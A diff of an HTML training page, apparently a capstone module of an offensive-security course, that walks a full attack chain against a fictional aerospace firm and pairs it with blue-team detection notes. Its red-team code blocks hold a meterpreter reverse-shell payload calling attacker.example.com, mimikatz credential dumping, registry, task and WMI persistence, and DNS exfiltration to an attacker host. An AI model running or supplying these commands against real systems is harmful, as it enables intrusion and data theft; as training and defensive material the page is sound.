@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -102,6 +119,7 @@
             color: #aaaaff;
             margin: 0.5rem 0;
             cursor: pointer;
+            position: relative;
         }
         .copy-paste:hover { background: #1a1a30; }
         .why-box {
@@ -146,13 +164,265 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .kill-chain-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .kc-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .kc-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .kc-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .team-section {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .team-red { border-color: var(--accent); }
+        .team-blue { border-color: #4444ff; }
+        .team-purple { border-color: var(--purple); }
+        .timeline {
+            position: relative;
+            margin: 2rem 0;
+            padding-left: 2rem;
+        }
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--accent);
+        }
+        .timeline-item {
+            position: relative;
+            margin-bottom: 1.5rem;
+            padding-left: 1rem;
+        }
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -2.35rem;
+            top: 0.5rem;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--accent);
+            border: 2px solid var(--bg);
+        }
+        .timeline-item.blue::before { background: #4444ff; }
+        .timeline-item.purple::before { background: var(--purple); }
+        .timeline-item h5 { color: var(--accent); margin-bottom: 0.3rem; }
+        .timeline-item.blue h5 { color: #4444ff; }
+        .timeline-item.purple h5 { color: var(--purple); }
+        .cert-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .cert-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: border-color 0.3s;
+        }
+        .cert-card:hover { border-color: var(--accent2); }
+        .cert-card h4 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .cert-tag {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-right: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        .tag-red { background: #3a0a0a; color: var(--accent); }
+        .tag-blue { background: #0a0a3a; color: #5555ff; }
+        .tag-purple { background: #3a0a3a; color: var(--purple); }
+        .tag-green { background: #0a3a0a; color: var(--accent2); }
+        .career-path {
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        .career-step {
+            text-align: center;
+            padding: 1.5rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 150px;
+            background: #0f0f15;
+        }
+        .career-step h5 { color: var(--neon); margin-bottom: 0.5rem; }
+        .career-arrow {
+            font-size: 24px;
+            color: var(--accent2);
+            align-self: center;
+        }
+        .module-index {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.5rem;
+            margin: 1.5rem 0;
+        }
+        .module-link {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.5rem;
+            color: var(--fg);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+        .module-link:hover {
+            border-color: var(--neon);
+            color: var(--neon);
+        }
+        .module-link span {
+            color: var(--dim);
+            font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_20_KILL_CHAIN.html">← Module 20</a>
+            <a href="MODULE_21_MOBILE.html">Module 21 (Mobile) →</a>
         </div>
 
         <h1>Module 21: Capstone <span class="status-badge status-live">CERTIFICATION</span></h1>
@@ -162,18 +432,441 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Knowledge is not competence. You can read every module, memorize every command, and still fail when it matters. The capstone is a <strong>live, unassisted exercise</strong> — you against a target network, with a time limit, no hints, and real consequences. Pass, and you earn the 22nd Survey Division certification. Fail, and you know exactly where to study.</p>
+            <p>Knowledge is not competence. You can read every module, memorize every command, and still fail when it matters. The capstone is a <span class="neon-highlight">live, unassisted exercise</span> — you against a target network, with a time limit, no hints, and real consequences. Pass, and you earn the 22nd Survey Division certification. Fail, and you know exactly where to study.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> In the real world, there are no hints. No walkthroughs. No second chances. The capstone is designed to simulate the <span class="neon-amber">stress, uncertainty, and complexity</span> of a real engagement. If you can pass this, you can operate in the field.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>This is the final exercise. No instructor, no hints, no safety net. You have a mission: compromise a target network, escalate privileges, establish persistence, and exfiltrate data. You have 8 hours. Your tools are your own. Your decisions are your own. Your success or failure is your own. This is what separates the operator from the student.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">Think of it as a live-fire exercise. The targets are real. The defenses are real. The only difference is that nobody dies if you fail — but your reputation does.</p>
         </div>
 
-        <h2>Exam Structure</h2>
+        <h2>📚 Capstone Overview</h2>
+        <p>The 22nd Survey Division Capstone is a comprehensive, hands-on assessment that evaluates your ability to execute a full offensive security engagement from reconnaissance to exfiltration. It is not a test of memorization — it is a test of <span class="neon-highlight">judgment, adaptability, and technical depth</span>.</p>
+
+        <div class="evidence-box">
+            <h3>🔬 What the Capstone Measures</h3>
+            <table>
+                <tr><th>Competency</th><th>Why It Matters</th><th>Modules Applied</th></tr>
+                <tr><td>Reconnaissance</td><td>You cannot attack what you do not understand</td><td><a href="MODULE_02_RECON.html" class="cross-link">02</a>, <a href="MODULE_01_NETWORKING.html" class="cross-link">01</a></td></tr>
+                <tr><td>Initial Access</td><td>Every breach starts with a foothold</td><td><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">10</a>, <a href="MODULE_17_SOCIAL_ENGINEERING.html" class="cross-link">17</a>, <a href="MODULE_09_MALWARE.html" class="cross-link">09</a></td></tr>
+                <tr><td>Privilege Escalation</td><td>Users cannot steal domain secrets</td><td><a href="MODULE_08_PRIVESC.html" class="cross-link">08</a>, <a href="MODULE_11_ROOTKITS.html" class="cross-link">11</a></td></tr>
+                <tr><td>Persistence</td><td>Access that evaporates is worthless</td><td><a href="MODULE_07_REGISTRY.html" class="cross-link">07</a>, <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">12</a></td></tr>
+                <tr><td>Credential Access</td><td>Credentials are the keys to the kingdom</td><td><a href="MODULE_06_MEMORY.html" class="cross-link">06</a>, <a href="MODULE_19_AD.html" class="cross-link">19</a></td></tr>
+                <tr><td>Lateral Movement</td><td>One machine is never the goal</td><td><a href="MODULE_15_LATERAL.html" class="cross-link">15</a>, <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">14</a></td></tr>
+                <tr><td>Domain Compromise</td><td>The crown jewel of every engagement</td><td><a href="MODULE_19_AD.html" class="cross-link">19</a>, <a href="MODULE_20_KILL_CHAIN.html" class="cross-link">20</a></td></tr>
+                <tr><td>Exfiltration</td><td>Data stolen is data proven</td><td><a href="MODULE_16_C2.html" class="cross-link">16</a>, <a href="MODULE_13_EDR_EVASION.html" class="cross-link">13</a></td></tr>
+                <tr><td>Documentation</td><td>Undocumented exploitation is indistinguishable from imagination</td><td>All modules</td></tr>
+            </table>
+        </div>
+
+        <h2>🌍 The GeoDefend Scenario</h2>
+        <p>GeoDefend is a fictional mid-sized aerospace engineering firm with approximately 500 employees, a hybrid cloud infrastructure, and a recently deployed EDR solution. They are the target for this capstone. Your client engagement letter authorizes you to test their external perimeter, internal network segmentation, and Active Directory security posture.</p>
+
+        <div class="method-card">
+            <h4>GeoDefend — Target Profile</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Industry:</strong> Aerospace & Defense subcontractor</li>
+                <li><strong>Employees:</strong> 500 (350 on-site, 150 remote)</li>
+                <li><strong>Domain:</strong> geodefend.local</li>
+                <li><strong>External IP:</strong> 203.0.113.0/24</li>
+                <li><strong>Internal Range:</strong> 192.168.100.0/24</li>
+                <li><strong>Cloud:</strong> Azure AD hybrid, Office 365 E3, AWS S3 backup buckets</li>
+                <li><strong>Defenses:</strong> CrowdStrike Falcon, Palo Alto NGFW, Proofpoint email gateway</li>
+                <li><strong>Key Assets:</strong> CAD designs, export-controlled technical data, contract proposals</li>
+            </ul>
+        </div>
+
+        <div class="why-box">
+            <h5>Why GeoDefend?</h5>
+            <p>GeoDefend represents a typical <span class="neon-amber">high-value target</span> in the defense industrial base (DIB). They are not a Fortune 500 with unlimited security budget, nor are they a small business with no defenses. They are the <span class="neon-highlight">sweet spot</span> for adversaries: valuable data, moderate defenses, and realistic attack surface. If you can compromise GeoDefend, you can compromise thousands of real companies just like it.</p>
+        </div>
+
+        <h2>⚔️ Full Kill Chain Walkthrough</h2>
+        <p>This section walks through the complete attack chain against GeoDefend, from initial reconnaissance to final exfiltration. Each phase maps to modules you have already studied. This is not a hint — it is a <span class="neon-highlight">demonstration of what mastery looks like</span>.</p>
+
+        <div class="kill-chain-flow">
+            <div class="kc-step">
+                <h5>1. RECON</h5>
+                <p><span class="neon-highlight">OSINT</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Map the target surface</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>2. WEAPONIZE</h5>
+                <p><span class="neon-highlight">Payload</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Build the delivery package</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>3. DELIVER</h5>
+                <p><span class="neon-highlight">Phish</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Get the payload to the target</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>4. EXPLOIT</h5>
+                <p><span class="neon-highlight">Execute</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Trigger the payload</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>5. INSTALL</h5>
+                <p><span class="neon-highlight">Implant</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Establish C2 beacon</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>6. C2</h5>
+                <p><span class="neon-highlight">Control</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Remote interactive access</p>
+            </div>
+            <div class="kc-arrow">→</div>
+            <div class="kc-step">
+                <h5>7. ACTION</h5>
+                <p><span class="neon-highlight">Achieve</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Exfiltrate the objective</p>
+            </div>
+        </div>
+
+        <h3>Phase 1: Reconnaissance</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: External Recon</h4>
+            <p>Before touching the target, you build an intelligence profile. Everything you learn now reduces surprise later.</p>
+            <div class="code-block">
+# Passive reconnaissance — no direct contact with target
+# Module 02: Reconnaissance techniques
+
+# 1. Identify subdomains and external hosts
+subfinder -d geodefend.com -o subs.txt
+assetfinder --subs-only geodefend.com >> subs.txt
+amass enum -d geodefend.com -o amass.txt
+
+# 2. Probe for live web services
+httpx -l subs.txt -o live_hosts.txt -title -tech-detect -status-code
+
+# 3. Find exposed S3 buckets (Module 14: Cloud Files)
+python3 cloud_enum.py -k geodefend
+# OR
+aws s3 ls s3://geodefend-backups --no-sign-request 2>/dev/null
+
+# 4. Harvest employee emails for phishing (Module 17: Social Engineering)
+theHarvester -d geodefend.com -b linkedin,google -f harvest.json
+
+# 5. Identify technology stack for targeted exploitation
+wappalyzer-cli https://portal.geodefend.com
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+            <div class="why-box">
+                <h5>Why this order matters</h5>
+                <p>Passive reconnaissance first. Every packet you send to the target is a potential detection event. Start with <span class="neon-highlight">public data</span> (subdomains, LinkedIn, job postings) before sending a single packet to their infrastructure. The more you know before you touch the target, the fewer mistakes you make when you do.</p>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Detection Opportunities</h4>
+            <p>Defenders should monitor for the reconnaissance phase — it is the only phase where the attacker is not yet inside.</p>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>DNS logs:</strong> Massive spike in NXDOMAIN responses (subdomain enumeration)</li>
+                <li><strong>Web logs:</strong> Sequential requests from single IP to multiple paths (dirbusting)</li>
+                <li><strong>Cloud trail:</strong> Unauthenticated S3 ListBucket calls from unusual IPs</li>
+                <li><strong>Email gateway:</strong> LinkedIn scraping often precedes spear-phishing campaigns</li>
+            </ul>
+        </div>
+
+        <h3>Phase 2: Weaponization</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: Building the Payload</h4>
+            <p>Weaponization is where you package your exploit into a deliverable form. For GeoDefend, we weaponize a malicious macro document targeting the engineering team's CAD software procurement process.</p>
+            <div class="code-block">
+# Weaponization workflow — Modules 05, 09, 10, 13
+
+# 1. Generate raw shellcode (Module 05: Shellcode)
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=attacker.example.com LPORT=443 \
+  EXITFUNC=thread -f raw -o raw.bin
+
+# 2. Encrypt and embed into VBA macro (Module 09: Malware)
+# Use XOR encryption with runtime decryption to evade static AV
+python3 encrypt_macro.py --input raw.bin --output macro.vba
+
+# 3. Test against local AV (Module 13: EDR Evasion)
+# Upload to VirusTotal (only if authorized) or local sandbox
+# Goal: 0/70 detections before delivery
+
+# 4. Build the pretext (Module 17: Social Engineering)
+# Subject: "Updated CAD License Agreement — Action Required by Friday"
+# Sender: spoofed as procurement@geodefend.com
+# Attachment: CAD_License_Update_2024.docm
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Weaponization Indicators</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Email headers:</strong> SPF/DKIM failures on internal-looking domains</li>
+                <li><strong>Attachment analysis:</strong> Macros with AutoOpen, suspicious VBA strings</li>
+                <li><strong>Threat intel:</strong> Newly registered domains mimicking your company</li>
+            </ul>
+        </div>
+
+        <h3>Phase 3: Delivery</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: Phishing Campaign</h4>
+            <p>Delivery is the moment of truth. The best payload in the world is useless if the target never opens it.</p>
+            <div class="code-block">
+# Delivery setup — Module 17: Social Engineering
+
+# 1. Clone a legitimate login page for credential harvesting
+gophish clone --url https://portal.geodefend.com --name geo_portal
+
+# 2. Configure SMTP relay using compromised legitimate service
+# (e.g., SendGrid account purchased from dark web market)
+
+# 3. Segment targets: engineers first (highest privilege, least suspicion)
+# Subject urgency: "CAD license expires in 48 hours — update required"
+
+# 4. Track opens and clicks (for reporting, not for premature exploitation)
+# Wait for at least 3 clicks before escalating to next phase
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Delivery Detection</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Email gateway:</strong> Unusual attachment types (.docm, .iso, .one) from external senders</li>
+                <li><strong>User reporting:</strong> Train users to report suspicious emails — the best sensor</li>
+                <li><strong>URL rewriting:</strong> Proofpoint / Mimecast links with unexpected redirects</li>
+            </ul>
+        </div>
+
+        <h3>Phase 4: Exploitation</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: Triggering the Payload</h4>
+            <p>The user opens the document and enables macros. The VBA macro decrypts the embedded shellcode and injects it into a legitimate process using <span class="neon-highlight">process hollowing</span> (Module 10).</p>
+            <div class="code-block">
+# Post-exploitation initial actions — Modules 08, 10, 11
+
+# 1. Immediate situational awareness
+whoami /all
+hostname
+systeminfo | findstr /B /C:"OS" /C:"System Type"
+
+# 2. Check privilege level and escalation path
+# (Module 08: Privilege Escalation)
+privilege::debug
+sekurlsa::logonpasswords
+
+# 3. Enumerate local AV/EDR
+# (Module 12: Defensive Verification)
+sc query windefend
+Get-Process | Where-Object {$_.ProcessName -match "CrowdStrike|SentinelOne|CarbonBlack"}
+
+# 4. If standard user, identify unpatched local privilege escalation
+# (Module 08: JuicyPotato, PrintSpooler, etc.)
+winPEASany.exe quiet
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Exploitation Detection</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>EDR telemetry:</strong> Office spawning PowerShell or cmd.exe</li>
+                <li><strong>Process hollowing:</strong> Suspicious memory allocations in legitimate processes</li>
+                <li><strong>AMSI:</strong> Blocked script content (if not bypassed — Module 11: AMSI)</li>
+                <li><strong>Behavioral:</strong> winPEASany.exe execution from Temp directory</li>
+            </ul>
+        </div>
+
+        <h3>Phase 5: Installation</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: Establishing Persistence</h4>
+            <p>One beacon is not enough. You need multiple persistence mechanisms so that losing one does not mean losing access.</p>
+            <div class="code-block">
+# Persistence mechanisms — Modules 07, 11, 12
+
+# 1. Registry run key (Module 07: Registry)
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
+  /v "OneDriveUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\update.exe" /f
+
+# 2. Scheduled task (stealthy, no admin required)
+schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Windows\Tasks\edge_update.exe" \
+  /sc onlogon /ru SYSTEM /f
+
+# 3. WMI event subscription (fileless persistence — Module 11: Rootkits)
+$FilterArgs = @{
+    Name='WinUpdateFilter'
+    EventNameSpace='root\\cimv2'
+    QueryLanguage='WQL'
+    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs
+
+# 4. Service creation (requires admin — use after privilege escalation)
+sc create "WindowsSysUpdate" binpath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Persistence Detection</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Autoruns:</strong> New entries in Run keys, scheduled tasks, services</li>
+                <li><strong>WMI introspection:</strong> <code>Get-WmiObject -Class __EventFilter -Namespace root\subscription</code></li>
+                <li><strong>Baseline deviation:</strong> Scheduled tasks not present in gold image</li>
+            </ul>
+        </div>
+
+        <h3>Phase 6: Command & Control</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: C2 Infrastructure</h4>
+            <p>C2 is your lifeline. If it is detected and cut, the engagement is over. Use domain fronting, HTTPS, and jitter to blend in.</p>
+            <div class="code-block">
+# C2 setup and evasion — Modules 13, 16
+
+# 1. Domain fronting through Azure CDN (Module 16: C2)
+# Host: a1b2c3d4.cloudfront.net
+# X-Forwarded-Host: attacker.example.com
+# To defenders: looks like legitimate Azure traffic
+
+# 2. Beacon jitter — avoid regular intervals
+set jitter 35%  # 30-second beacon becomes 19.5-40.5 seconds
+
+# 3. Sleep obfuscation (Module 13: EDR Evasion)
+# Encrypt beacon in memory during sleep to evade memory scanners
+
+# 4. Named pipe pivoting for lateral movement (Module 15: Lateral Movement)
+# Internal C2 over SMB pipes to avoid firewall egress rules
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: C2 Detection</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>SSL inspection:</strong> Decrypt and inspect HTTPS for beacon patterns</li>
+                <li><strong>DNS:</strong> DGA domains, high entropy subdomains, long TTLs</li>
+                <li><strong>NetFlow:</strong> Regular intervals to single external IP (before jitter applied)</li>
+                <li><strong>Named pipes:</strong> Unusual SMB pipe names (not lsarpc, samr, etc.)</li>
+            </ul>
+        </div>
+
+        <h3>Phase 7: Actions on Objectives — Exfiltration</h3>
+        <div class="team-section team-red">
+            <h4>🔴 Red Team: Data Exfiltration</h4>
+            <p>The final objective: extract the flag file and sensitive data without triggering DLP or network alerts.</p>
+            <div class="code-block">
+# Exfiltration techniques — Modules 14, 16
+
+# 1. Compress and encrypt data before exfiltration
+7z a -psecret -mhe=on archive.7z C:\flag.txt C:\GeoDefend\CAD_Designs\
+
+# 2. Exfiltrate via DNS TXT records (slow, stealthy)
+# Module 16: C2 — split file into chunks, base64 encode, query as subdomains
+for chunk in $(split -b 63 archive.7z.enc); do
+  dig +short $chunk.attacker.example.com
+done
+
+# 3. Exfiltrate via legitimate cloud service (Module 14: Cloud Files)
+# Upload to attacker-controlled OneDrive / Dropbox / GitHub Gist
+# Blends with normal user behavior
+
+# 4. Verify integrity
+sha256sum C:\flag.txt
+# Expected: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="team-section team-blue">
+            <h4>🔵 Blue Team: Exfiltration Detection</h4>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>DLP:</strong> Unusual volume of CAD files (.dwg, .step) leaving the network</li>
+                <li><strong>DNS:</strong> High volume of TXT queries or long subdomain queries</li>
+                <li><strong>Cloud access:</strong> Personal cloud storage uploads from corporate assets</li>
+                <li><strong>NetFlow:</strong> Sustained outbound transfer to unknown destinations</li>
+            </ul>
+        </div>
+
+        <h2>🔵 Blue Team Detection Playbook</h2>
+        <p>Effective defense requires understanding the attacker's perspective. This section provides a structured detection playbook for each kill chain phase.</p>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h5>Reconnaissance Detection</h5>
+                <p>Monitor for mass DNS resolution, port scanning from single sources, and certificate transparency log monitoring. Correlate external scanning with subsequent phishing attempts.</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Initial Access Detection</h5>
+                <p>Focus on email gateway alerts, macro execution, and browser exploitation. The first execution is your best chance to stop the chain.</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Execution Detection</h5>
+                <p>AMSI, PowerShell script block logging, and Sysmon Event ID 1 (process creation) are critical. Look for LOLBAS (Living Off The Land Binaries and Scripts).</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Persistence Detection</h5>
+                <p>Weekly Autoruns audits, WMI subscription reviews, and scheduled task baselines. Persistence is where attackers get sloppy — they leave artifacts.</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Privilege Escalation Detection</h5>
+                <p>Monitor for TokenPrivilege adjustments, named pipe impersonation, and UAC bypass techniques. Event ID 4673 (privileged service call) is valuable.</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Credential Access Detection</h5>
+                <p>LSASS access by non-system processes, Kerberoasting (Event ID 4769), and DCSync (Event ID 4662 with replication rights). Enable Audit Credential Validation.</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Lateral Movement Detection</h5>
+                <p>Monitor for SMB connections from workstations to workstations, WMI remote execution (Event ID 5856), and RDP lateral movement (Event ID 4624 Type 10).</p>
+            </div>
+            <div class="timeline-item blue">
+                <h5>Exfiltration Detection</h5>
+                <p>DLP alerts, DNS tunneling detection, and outbound data volume baselines. The attacker has already won — now you need to know what they took.</p>
+            </div>
+        </div>
+
+        <h2>🟣 Purple Team Analysis</h2>
+        <p>Purple teaming is the collaborative integration of red and blue capabilities. The goal is not to "win" but to <span class="neon-purple">improve organizational resilience</span> through continuous feedback.</p>
+
+        <div class="team-section team-purple">
+            <h4>🟣 Purple Team Methodology</h4>
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Plan:</strong> Define scope, rules of engagement, and success criteria jointly</li>
+                <li><strong>Execute:</strong> Red team attacks while blue team observes in real-time</li>
+                <li><strong>Analyze:</strong> Review detection gaps, missed alerts, and false positives</li>
+                <li><strong>Improve:</strong> Blue team implements new detections; red team validates evasion</li>
+                <li><strong>Repeat:</strong> Continuous cycle — security is not a destination</li>
+            </ol>
+        </div>
+
+        <div class="timeline">
+            <div class="timeline-item purple">
+                <h5>Gap Analysis</h5>
+                <p>After each engagement, map every technique to MITRE ATT&CK and identify undetected TTPs. These are your highest priority improvements.</p>
+            </div>
+            <div class="timeline-item purple">
+                <h5>Detection Engineering</h5>
+                <p>Convert red team techniques into detection rules: Sigma, YARA, Splunk SPL, or KQL. Test with red team before deploying to production.</p>
+            </div>
+            <div class="timeline-item purple">
+                <h5>Metrics That Matter</h5>
+                <p>Mean Time to Detect (MTTD), Mean Time to Respond (MTTR), and dwell time. Track these over time to measure improvement, not just activity.</p>
+            </div>
+            <div class="timeline-item purple">
+                <h5>Adversary Emulation</h5>
+                <p>Use tools like Caldera, Atomic Red Team, or Prelude to continuously validate detections. Automated purple team exercises scale what manual engagements cannot.</p>
+            </div>
+        </div>
+
+        <h2>📋 Exam Structure</h2>
 
         <div class="exam-section">
-            <h3>📋 Environment</h3>
+            <h3>🎯 Environment</h3>
             <p>You are given VPN access to a lab network with three machines:</p>
